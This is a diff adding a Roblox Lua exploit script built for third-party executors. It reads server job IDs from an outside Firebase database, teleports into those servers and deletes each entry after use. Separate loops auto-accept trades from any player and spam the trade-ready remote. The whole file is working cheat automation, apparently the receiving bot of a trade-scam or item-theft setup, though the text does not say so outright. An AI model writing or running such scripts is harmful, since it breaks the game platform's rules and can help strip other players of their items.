@@ -1,0 +1,200 @@
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+
+-- === FIREBASE ===
+local FIREBASE_BASE = "https://api2-3dee6-default-rtdb.europe-west1.firebasedatabase.app"
+local SERVERS_URL = FIREBASE_BASE .. "/servers.json"
+
+-- === SETTINGS ===
+local PLACE_ID = game.PlaceId
+local MAX_AGE = 180 -- свежесть серверов (сек)
+local CHECK_DELAY = 3
+local TRADE_CHECK_DELAY = 0.5
+
+-- HTTP (под все executors)
+local httpRequest = request or http_request or (syn and syn.request)
+
+-- visited сервера (анти дубль)
+local visited = {}
+
+print("🤖 Smart Watcher + Auto Trade Started")
+
+-- === REMOTE TRADE ===
+local tradeRemote = ReplicatedStorage
+    :WaitForChild("Shared")
+    :WaitForChild("Remotes")
+    :WaitForChild("Networking")
+    :WaitForChild("RF/TradeRespondToOffer")
+
+-- === УДАЛЕНИЕ СЕРВЕРА ИЗ БД ===
+local function deleteServer(key)
+    if not httpRequest then return end
+
+    pcall(function()
+        httpRequest({
+            Url = FIREBASE_BASE .. "/servers/" .. key .. ".json",
+            Method = "DELETE"
+        })
+    end)
+
+    print("🗑️ Deleted server:", key)
+end
+
+-- === АВТО ЗАХОД В СЕРВЕР ===
+local function joinServer(jobId, key)
+    if not jobId then return end
+
+    -- если это текущий сервер — удаляем чтобы не было loop
+    if jobId == game.JobId then
+        deleteServer(key)
+        return
+    end
+
+    visited[jobId] = true
+    print("🚀 Joining server:", jobId)
+
+    local success = pcall(function()
+        TeleportService:TeleportToPlaceInstance(
+            PLACE_ID,
+            jobId,
+            player
+        )
+    end)
+
+    if success then
+        deleteServer(key)
+    end
+end
+
+-- === AUTO TRADE ACCEPT LOOP ===
+task.spawn(function()
+    while task.wait(TRADE_CHECK_DELAY) do
+        local playerGui = player:FindFirstChild("PlayerGui")
+        if not playerGui then continue end
+
+        local tradeGui = playerGui:FindFirstChild("TradeRequest")
+        if not tradeGui then continue end
+
+        if tradeGui.Enabled == true then
+            print("💰 Trade request detected!")
+
+            -- пробуем принять трейд от любого игрока
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr ~= player then
+                    local userId = tostring(plr.UserId)
+
+                    pcall(function()
+                        tradeRemote:InvokeServer(userId, true)
+                    end)
+
+                    task.wait(0.5)
+                end
+            end
+        end
+    end
+end)
+
+-- === AUTO READY TRADE LOOP ===
+local readyRemote = ReplicatedStorage
+    :WaitForChild("Shared")
+    :WaitForChild("Remotes")
+    :WaitForChild("Networking")
+    :WaitForChild("RE/Trading/TradeReadyTrade")
+
+local tradeActive = false
+
+task.spawn(function()
+    while task.wait(0.2) do
+        local playerGui = player:FindFirstChild("PlayerGui")
+        if not playerGui then continue end
+
+        local menus = playerGui:FindFirstChild("Menus")
+        if not menus then continue end
+
+        local tradeMenu = menus:FindFirstChild("Trade")
+        if not tradeMenu then continue end
+
+        -- если трейд открылся
+        if tradeMenu.Visible and not tradeActive then
+            tradeActive = true
+            print("📦 Trade menu detected, waiting 6 seconds...")
+
+            task.wait(6)
+
+            -- цикл перебора от 0 до 9
+            task.spawn(function()
+                while tradeMenu.Visible do
+                    for i = 0, 9 do
+                        if not tradeMenu.Visible then
+                            tradeActive = false
+                            break
+                        end
+
+                        local args = { true, i }
+                        pcall(function()
+                            readyRemote:FireServer(unpack(args))
+                        end)
+
+                        task.wait(0.2)
+                    end
+                end
+
+                tradeActive = false
+                print("❌ Trade menu closed, stopping ready loop")
+            end)
+        end
+    end
+end)
+
+
+
+
+-- === SERVER WATCHER LOOP ===
+while task.wait(CHECK_DELAY) do
+    if not httpRequest then
+        warn("HTTP not supported")
+        break
+    end
+
+    local success, response = pcall(function()
+        return game:HttpGet(SERVERS_URL)
+    end)
+
+    if not success or not response or response == "null" then
+        continue
+    end
+
+    local data
+    local ok = pcall(function()
+        data = HttpService:JSONDecode(response)
+    end)
+
+    if not ok or not data then
+        continue
+    end
+
+    for key, server in pairs(data) do
+        local jobId = server.jobId
+        local placeId = server.placeId
+        local timestamp = server.time or 0
+
+        if jobId
+        and placeId == PLACE_ID
+        and not visited[jobId]
+        and (os.time() - timestamp <= MAX_AGE) then
+
+            joinServer(jobId, key)
+            task.wait(8)
+            break
+        else
+            -- авто чистка старых серверов (>10 минут)
+            if timestamp and (os.time() - timestamp > 600) then
+                deleteServer(key)
+            end
+        end
+    end
+end
